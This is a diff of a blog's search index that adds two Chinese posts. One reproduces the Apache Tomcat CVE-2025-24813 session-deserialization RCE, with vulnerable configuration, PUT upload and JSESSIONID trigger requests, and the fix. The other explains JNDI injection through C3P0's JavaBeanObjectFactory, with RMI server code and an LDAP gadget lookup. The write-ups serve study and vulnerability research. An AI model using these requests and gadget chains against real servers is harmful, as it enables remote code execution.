@@ -4,6 +4,52 @@
   
   
   <entry>
+    <title>CVE-2025-24813 Apache Tomcat远程代码执行漏洞</title>
+    <link href="/2025/03/14/CVE-2025-24813%20Apache%20Tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2025/03/14/CVE-2025-24813%20Apache%20Tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看到的漏洞，还涉及到Java、Tomcat和session反序列化，不得不学习了。</p><p>还是AI助我。</p><a id="more"></a><hr><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>先问问AI受影响版本然后再搭建环境：</p><pre><code>该漏洞影响以下Apache Tomcat版本：​9.x系列：9.0.0.M1至9.0.98​10.x系列：10.1.0.M1至10.1.34​11.x系列：11.0.0.M1至11.0.2（完整列表可参考Apache官方公告）</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>来自AI总结。</p><h4 id="文件名处理逻辑缺陷"><a href="#文件名处理逻辑缺陷" class="headerlink" title="文件名处理逻辑缺陷"></a>文件名处理逻辑缺陷</h4><p>当Tomcat的DefaultServlet启用写入功能时，处理PUT请求会将用户提供的文件路径中的斜杠/替换为点号.，并将文件写入临时目录（默认为$CATALINA_BASE/temp）。例如，攻击者构造的恶意路径/WEB-INF/web.xml会被转换为WEB-INF.web.xml，绕过目录层级限制。</p><h4 id="会话持久化与反序列化链结合"><a href="#会话持久化与反序列化链结合" class="headerlink" title="会话持久化与反序列化链结合"></a>会话持久化与反序列化链结合</h4><p>若应用同时满足以下条件，攻击者可上传恶意序列化文件至会话存储目录，并通过JSESSIONID触发反序列化操作实现RCE：</p><ol><li>​启用DefaultServlet写入功能​（默认禁用）</li><li>支持Partial PUT请求​（默认启用）</li><li>​使用Tomcat默认会话存储路径​（需额外配置）</li><li>​依赖存在反序列化漏洞的库​（如commons-collections）</li></ol><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>去<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/" target="_blank" rel="noopener">官方网站</a>下载一个9.0.98版本的Tomcat作为漏洞环境，解压即用很方便。</p><p>根据漏洞原理，漏洞搭建还需要完成三个步骤。</p><h4 id="启用会话持久化"><a href="#启用会话持久化" class="headerlink" title="启用会话持久化"></a>启用会话持久化</h4><p>修改conf/context.xml，添加一段：</p><pre><code class="xml">&lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot;&gt;    &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot;/&gt;&lt;/Manager&gt;</code></pre><p>此配置将Session数据存储在默认路径$CATALINA_BASE/work/Catalina/localhost/下。</p><h4 id="开启DefaultServlet写入权限"><a href="#开启DefaultServlet写入权限" class="headerlink" title="开启DefaultServlet写入权限"></a>开启DefaultServlet写入权限</h4><p>修改conf/web.xml文件，找到DefaultServlet配置，添加一段：</p><pre><code class="xml">&lt;init-param&gt;    &lt;param-name&gt;readonly&lt;/param-name&gt;    &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>此配置允许通过PUT方法写入文件。</p><h4 id="引入反序列化漏洞"><a href="#引入反序列化漏洞" class="headerlink" title="引入反序列化漏洞"></a>引入反序列化漏洞</h4><p>在lib目录下面放一个含有反序列化漏洞的jar文件，比如commons-collections的jar文件。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先观察一下PUT请求的处理方式，找到DefaultServlet类的doPut函数，一进来就看到判断readOnly配置：</p><pre><code class="java">if (this.readOnly) {    this.sendNotAllowed(req, resp);}</code></pre><p>如果将readOnly配置为了false，就会进入写入文件环节：</p><pre><code class="java">String path = this.getRelativePath(req);WebResource resource = this.resources.getResource(path);Range range = this.parseContentRange(req, resp);if (range != null) {    InputStream resourceInputStream = null;    try {        if (range == IGNORE) {            resourceInputStream = req.getInputStream();        } else {            File contentFile = this.executePartialPut(req, range, path);            resourceInputStream = new FileInputStream(contentFile);        }        if (this.resources.write(path, resourceInputStream, true)) {            if (resource.exists()) {                resp.setStatus(204);            } else {                resp.setStatus(201);            }        }        ...    }}</code></pre><p>executePartialPut函数会替换访问路径中的斜杠/为点号.：</p><pre><code class="java">String convertedResourcePath = path.replace(&#39;/&#39;, &#39;.&#39;);</code></pre><p>再来摸索一下Tomcat和session机制，写一个简单的test.jsp文件，放到webapps/test目录下：</p><pre><code class="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; %&gt;&lt;html&gt;&lt;body&gt;    &lt;!-- 存储Session --&gt;    &lt;%        session.setAttribute(&quot;count&quot;, 1);    %&gt;    &lt;!-- 获取Session --&gt;    &lt;p&gt;访问次数: &lt;%= session.getAttribute(&quot;count&quot;) %&gt;&lt;/p&gt;    &lt;!-- 删除Session --&gt;    &lt;a href=&quot;logout.jsp&quot;&gt;退出登录&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>该jsp可以保存和读取session，带上JSESSIONID访问并保存好数据后，关闭Tomcat，Tomcat就会将session的内容序列化后保存到文件里，session文件路径为work/Catalina/localhost/test。</p><p>测试一下PUT方法：</p><pre><code class="http">PUT /test/xxxxx/session HTTP/1.1Host: localhost:8080Content-Length: 1000Content-Range: bytes 0-1000/1200test</code></pre><p>然后在work/Catalina/localhost/test目录下就能看到.xxxxx.session文件了，由于PUT方式上传的虚假session文件跟正经的session文件都在同一个目录下，因此可以上传session，再设置JSESSIONID=.xxxxx来触发反序列化，但是session文件的格式看起来并不是简单的仅仅一个序列化对象，而是多种数据的结构体。</p><p>观察一下session的读取方式，根据修改了的配置文件，session持久化保存需要配置的类为PersistentManager和FileStore，将Tomcat的lib目录导入IDEA项目搜索一下就能找到类对应的字节码了。</p><p>找到FileStore类的save函数，关键代码如下：</p><pre><code class="java">FileOutputStream fos = new FileOutputStream(file.getAbsolutePath());try {    ObjectOutputStream oos = new ObjectOutputStream(new BufferedOutputStream(fos));    try {        ((StandardSession)session).writeObjectData(oos);    } catch (Throwable var9) {        try {            oos.close();        } catch (Throwable var8) {            var9.addSuppressed(var8);        }        throw var9;    }    oos.close();}</code></pre><p>使用StandardSession类的writeObjectData函数将session序列化后写入文件中，后面会进入到doWriteObject函数中：</p><pre><code class="java">protected void doWriteObject(ObjectOutputStream stream) throws IOException {    stream.writeObject(this.creationTime);    stream.writeObject(this.lastAccessedTime);    stream.writeObject(this.maxInactiveInterval);    stream.writeObject(this.isNew);    stream.writeObject(this.isValid);    stream.writeObject(this.thisAccessedTime);    stream.writeObject(this.id);    ...}</code></pre><p>可以看到，session文件中确实存在多种序列化数据，但是也可以看到序列化过程统一使用的是writeObject，无论是long还是其他类型的数据，也就是说我们可以不管它的结构，只需要在session文件中存放一个序列化对象，就能触发反序列化了。</p><p>再观察一下反序列化过程，找到doReadObject函数：</p><pre><code class="java">this.authType = null;this.creationTime = (Long)stream.readObject();this.lastAccessedTime = (Long)stream.readObject();this.maxInactiveInterval = (Integer)stream.readObject();this.isNew = (Boolean)stream.readObject();this.isValid = (Boolean)stream.readObject();this.thisAccessedTime = (Long)stream.readObject();this.principal = null;</code></pre><p>先readObject再强行类型转换，那思路通。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先把带有反序列化漏洞的commons-collections.jar放到webapps/test/lib目录下，再使用ysoserial生成一个序列化数据文件，同时base64编码一下，结果试了一下都不成功。</p><p>只能开始尝试调试Tomcat了，在IDEA中新建一个webapp项目，然后引入Tomcat的lib目录，再把commons-collections.jar放到lib目录下，最后配置本地Tomcat启动。</p><p>根据启动时的命令行信息，IDEA启动的Tomcat工作目录在用户的\AppData\Local\JetBrains\IntelliJIdea2024.3\tomcat\目录下，部署的目录为tomcat_war_exploded，因此需要发包：</p><pre><code class="http">PUT /tomcat_war_exploded/xxxxx/session HTTP/1.1Host: localhost:8080Content-Length: 1000Content-Range: bytes 0-1000/1200{{base64decode(序列化数据)}}}}</code></pre><p>然后在工作目录的work\Catalina\localhost\tomcat_war_exploded目录下能看到上传的session文件，也可以给class文件下断点调试了。</p><p>然后带上JSESSIONID访问并且调试一下：</p><pre><code class="http">GET /tomcat_war_exploded/ HTTP/1.1Host: localhost:8080Cookie: JSESSIONID=.xxxxx</code></pre><p>发现问题：</p><pre><code>java.io.StreamCorruptedException: invalid stream header: FFFE08E1</code></pre><p>看起来是Windows的锅，确实看base64后的序列化数据开头就不对劲。</p><p>直接使用IDEA打开ysoserial，重新生成base64编码后的payload再次尝试：</p><pre><code class="java">ByteArrayOutputStream bos = new ByteArrayOutputStream();Serializer.serialize(object, bos);String serializedBytes = new String(Base64.getEncoder().encode(bos.toByteArray()));System.out.println(serializedBytes);</code></pre><p>成功触发反序列化漏洞。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>根据AI：</p><pre><code>代码层修复细节官方在DefaultServlet的doPut方法中增加安全检查，限制临时文件路径的生成规则，避免用户输入的/被替换为.后绕过目录限制。具体修改涉及对executepartialput方法的调用逻辑。</code></pre><p>修改了executePartialPut函数：</p><pre><code class="java">File tempDir = (File)this.getServletContext().getAttribute(&quot;javax.servlet.context.tempdir&quot;);File contentFile = File.createTempFile(&quot;put-part-&quot;, (String)null, tempDir);RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, &quot;rw&quot;);</code></pre><p>删掉了将/变成.的代码。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg5NTg4MTEwNg==&amp;mid=2247484054&amp;idx=1&amp;sn=cc17fdf41c20b0cf942ab2679acca3e3&amp;chksm=c1d75edd68de6ac7e888624a0de354499ec85904f4cabebc9fd3de701268429414d338b610af#rd" target="_blank" rel="noopener">Tomcat CVE-2025-24813 RCE复现(含环境下载地址)</a></p><p><a href="https://cn-sec.com/archives/3833766.html" target="_blank" rel="noopener">汤姆猫最新CVE复现及分析</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>Tomcat</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>高版本下的JNDI注入学习</title>
+    <link href="/2025/03/13/%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2025/03/13/%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习，类似Tomcat依赖环境下的利用方式，这次学习的是C3P0依赖环境下的利用方式，算是一种拓展攻击面吧。</p><p>类似Tomcat环境下的BeanFactory可以调用一个public方法，该环境中的JavaBeanObjectFactory可以调用setter。</p><p>此外还需要一个环境ibatis-sqlmap下面的JtaTransactionConfig类，用于嵌套多一层JNDI。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>两个依赖：</p><pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;&lt;dependency&gt;  &lt;groupId&gt;com.mchange&lt;/groupId&gt;  &lt;artifactId&gt;c3p0&lt;/artifactId&gt;  &lt;version&gt;0.10.2&lt;/version&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;  &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;  &lt;version&gt;2.3.4.726&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p>回忆一下，本地Factory要满足的两个条件：</p><ul><li>继承ObjectFactory</li><li>存在getObjectInstance方法</li></ul><p>然后就可以调用它的getObjectInstance函数。</p><p>而C3P0JavaBeanObjectFactory继承自JavaBeanObjectFactory类，其getObjectInstance函数如下：</p><pre><code class="java">public Object getObjectInstance(Object refObj, Name name, Context nameCtx, Hashtable env)throws Exception {  if (refObj instanceof Reference) {    Reference ref = (Reference) refObj;    Map refAddrsMap = new HashMap();    for (Enumeration e = ref.getAll(); e.hasMoreElements(); ) {      RefAddr addr = (RefAddr) e.nextElement();      refAddrsMap.put( addr.getType(), addr );    }    Class beanClass = Class.forName( ref.getClassName() );    Set refProps = null;    RefAddr refPropsRefAddr = (BinaryRefAddr) refAddrsMap.remove( JavaBeanReferenceMaker.REF_PROPS_KEY );    if ( refPropsRefAddr != null )        refProps = (Set) SerializableUtils.fromByteArray( (byte[]) refPropsRefAddr.getContent() );    Map propMap = createPropertyMap( beanClass, refAddrsMap );    return findBean( beanClass, propMap, refProps );  }  else      return null;}</code></pre><p>可以看到非常令人激动的函数名称findBean，这个getObjectInstance函数的逻辑看起来就是从ref对象里面取出类名和属性名，再进入findBean函数进行实例化和反射赋值。</p><p>再看看这个findBean函数：</p><pre><code class="java">protected Object findBean(Class beanClass, Map propertyMap, Set refProps ) throws Exception {  Object bean = createBlankInstance( beanClass );  BeanInfo bi = Introspector.getBeanInfo( bean.getClass() );  PropertyDescriptor[] pds = bi.getPropertyDescriptors();  for (int i = 0, len = pds.length; i &lt; len; ++i) {    PropertyDescriptor pd = pds[i];    String propertyName = pd.getName();    Object value = propertyMap.get( propertyName );    Method setter = pd.getWriteMethod();    if (value != null) {      if (setter != null)          setter.invoke( bean, new Object[] { (value == NULL_TOKEN ? null : value) } );      else {        ...      }    }    ...  }  return bean;}</code></pre><p>可以看到createBlankInstance先创建了一个空白的对象：</p><pre><code class="java">protected Object createBlankInstance(Class beanClass) throws Exception{ return beanClass.newInstance(); }</code></pre><p>再调用setter，由于setter是按顺序调用的，因此可能导致利用的时候发生一些错误，比如参考文章里调用JdbcRowSetImpl的setter时就因为顺序问题导致发起JNDI连接失败。</p><p>发现ResourceRef类无法引入，看起来需要在pom.xml中引入一下Tomcat依赖：</p><pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;    &lt;version&gt;10.1.39&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>结果发现版本有问题，Tomcat10不能在Java8运行，只能删掉改成从磁盘上的Tomcat引入jar包了。</p><p>写一个Test.java用于测试setter调用：</p><pre><code class="java">package org.example;public class Test {    private String data;    public void setData(String data) {        this.data = data;        System.out.println(data);    }    public String getData() {        return data;    }}</code></pre><p>搭建一下RMI服务端：</p><pre><code class="java">package org.example;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.StringRefAddr;import java.io.IOException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import org.apache.naming.ResourceRef;public class App {    public static void main( String[] args ) {        try {            Registry registry = LocateRegistry.createRegistry(8888);            ResourceRef resourceRef = c3p0();            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);            registry.bind(&quot;c3p0&quot;, referenceWrapper);        }catch (Exception e) {            e.printStackTrace();        }        System.out.println(&quot;Registry运行中......&quot;);    }    private static ResourceRef c3p0() throws IOException {        ResourceRef ref = new ResourceRef(&quot;org.example.Test&quot;,null,&quot;&quot;,&quot;&quot;,true,                &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;,null);        ref.add(new StringRefAddr(&quot;data&quot;, &quot;Hello, World!&quot;));        return ref;    }}</code></pre><p>再启动客户端去连接，在实际应用中，这一步可以通过Fastjson反序列化、JNDI注入等方式来实现：</p><pre><code class="java">package org.example;import javax.naming.InitialContext;public class Client {    public static void main(String[] args) {        try {            String string = &quot;rmi://localhost:8888/c3p0&quot;;            InitialContext initialContext = new InitialContext();            initialContext.lookup(string);        }catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>启动，看到setter正常触发了：</p><pre><code>三月 13, 2025 10:08:28 上午 com.mchange.v2.log.MLog 信息: MLog clients using java 1.4+ standard logging.三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: singleton三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: auth三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: scopeHello, World!</code></pre><p>通过C3P0依赖，可以按顺序调用setter，一般情况下不会有什么未初始化问题。</p><h3 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h3><p>用于开启一个字节流反序列化点，不过JNDI使用LDAP好像就有反序列化功能了。</p><p>通过setUserOverridesAsString可以触发反序列化：</p><pre><code class="java">private static ResourceRef c3p0() throws IOException {    ResourceRef ref = new ResourceRef(&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,null,&quot;&quot;,&quot;&quot;,true,            &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;,null);    ref.add(new StringRefAddr(&quot;userOverridesAsString&quot;, &quot;Hello, World!&quot;));    return ref;}</code></pre><h3 id="JtaTransactionConfig"><a href="#JtaTransactionConfig" class="headerlink" title="JtaTransactionConfig"></a>JtaTransactionConfig</h3><p>用于嵌套多一层JNDI，应用面可能比较窄。</p><p>参考文章：</p><pre><code class="java">private static ResourceRef jndi() throws IOException {    ResourceRef ref = new ResourceRef(&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;, null);    Properties properties = new Properties();    properties.put(&quot;UserTransaction&quot;, &quot;ldap://127.0.0.1:1389/deserialCommonsCollections6&quot;);    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    objectOutputStream.writeObject(properties);    byte [] bytes = byteArrayOutputStream.toByteArray();    ref.add(new BinaryRefAddr(&quot;properties&quot;, bytes));    return ref;}</code></pre><p>由于setProperties方法需要的参数properties类型为Properties，因此不能使用StringRefAddr，需要使用RefAddr的另一个实现类BinaryRefAddr。</p><hr><p><a href="https://forum.butian.net/share/4142" target="_blank" rel="noopener">高版本 jndi 调用 setter 方法拓展攻击面</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>JNDI</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2024-53677(S2-067)学习</title>
     <link href="/2025/03/10/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/"/>
     <url>/2025/03/10/struts%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/</url>
@@ -387,9 +433,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>XSS</tag>
       
@@ -410,9 +456,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -431,9 +477,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -452,9 +498,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -3337,9 +3383,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -3446,9 +3492,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>PHP</tag>
       
@@ -3469,9 +3515,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -3492,9 +3538,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -3559,9 +3605,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -3584,9 +3630,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>FastCGI</tag>
       
@@ -3607,9 +3653,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Mongodb</tag>
       
@@ -3632,9 +3678,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -3655,11 +3701,11 @@
     
     <tags>
       
+      <tag>CTF</tag>
+      
       <tag>Web</tag>
       
       <tag>Java</tag>
-      
-      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -3741,9 +3787,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -3808,13 +3854,13 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
       
-      <tag>复现</tag>
+      <tag>Web</tag>
       
       <tag>NodeJS</tag>
+      
+      <tag>复现</tag>
       
       <tag>前端</tag>
       
@@ -3839,9 +3885,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -3860,9 +3906,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -3904,11 +3950,11 @@
     
     <tags>
       
+      <tag>CTF</tag>
+      
       <tag>Web</tag>
       
       <tag>Java</tag>
-      
-      <tag>CTF</tag>
       
       <tag>Spring</tag>
       
@@ -3996,9 +4042,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Karaf</tag>
       
@@ -4228,9 +4274,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
